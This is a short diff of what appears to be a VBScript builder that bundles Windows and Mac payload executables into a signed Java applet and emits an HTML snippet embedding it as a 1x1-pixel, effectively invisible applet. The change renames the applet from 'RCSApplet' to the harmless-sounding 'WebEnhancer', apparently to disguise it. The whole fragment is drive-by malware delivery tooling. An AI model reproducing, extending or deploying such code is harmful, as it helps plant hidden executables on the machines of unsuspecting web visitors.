@@ -32,7 +32,7 @@ SignedApplet = OutputName & ".jar"
 AppletCertificate = OutputName & ".cer"
 PayloadWin = Payload & ".exe"
 PayloadMac = Payload
-JarFile =  "RCSApplet.jar"
+JarFile =  "WebEnhancer.jar"
 KeyStore = "applet_keystore"
 
 If not objFSO.FileExists(PayloadWin) then
@@ -79,7 +79,7 @@ End If
 
 WScript.Echo "Creating HTML snippet."
 Set objFile = objFSO.CreateTextFile(OutputName & ".html")
-objFile.WriteLine("<applet width='1' height='1' code=RCSApplet archive='" & SignedApplet & "' />")
+objFile.WriteLine("<applet width='1' height='1' code=WebEnhancer archive='" & SignedApplet & "'></applet>")
 
 WScript.Echo
 WScript.Echo "Done."
